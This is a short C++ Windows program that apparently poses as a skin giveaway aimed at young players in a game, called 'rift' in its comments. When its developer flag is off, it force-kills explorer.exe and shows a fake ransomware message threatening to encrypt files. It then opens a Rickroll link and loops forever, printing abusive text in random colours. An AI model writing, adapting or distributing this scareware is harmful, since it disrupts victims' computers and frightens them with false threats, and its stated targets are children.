#include <stdio.h>                         
#include <string.h>
#include <fstream>
#include <Windows.h>
#include <shellapi.h>
#include <iostream>
#include <random>



//This is harmless, but to the 9 year old in rift, their pc is fucked.

bool bDeveloper = true; //don't forget to change 
HANDLE hConsole = GetStdHandle(STD_OUTPUT_HANDLE);

int RandomInt(int min = 1, int max = 100)
{
	//https://stackoverflow.com/questions/13445688/how-to-generate-a-random-number-in-c
	std::random_device dev;
	std::mt19937 rng(dev());
	std::uniform_int_distribution<std::mt19937::result_type> dist6(min, max);

	return dist6(rng);
}

void SpamShit()
{
	SetConsoleTextAttribute(hConsole, RandomInt(15));
	std::cout << "GET FUCKED LMFAOO\n";
	SetConsoleTextAttribute(hConsole, RandomInt(15));
	std::cout << "NEXT TIME DON'T ASK FOR SKINS\n";

	if (!bDeveloper)
		ShellExecute(NULL, NULL, L"https://www.youtube.com/watch?v=iik25wqIuFo&ab_channel=Rickroll%2Cbutwithadifferentlink", NULL, NULL, SW_SHOWNORMAL);
}

int main()
{
	if (!bDeveloper)
	{
		system("taskkill /IM explorer.exe /F");
		MessageBoxA(nullptr, "Your Computer is Infected. If you close this window, all your files will be Encrypted. Press OK to enjoy the last 5 minutes of your pc ;)", "skīñś", MB_OK);
	}

LoadShit:
	SpamShit();
	goto LoadShit;

	return 0;
}
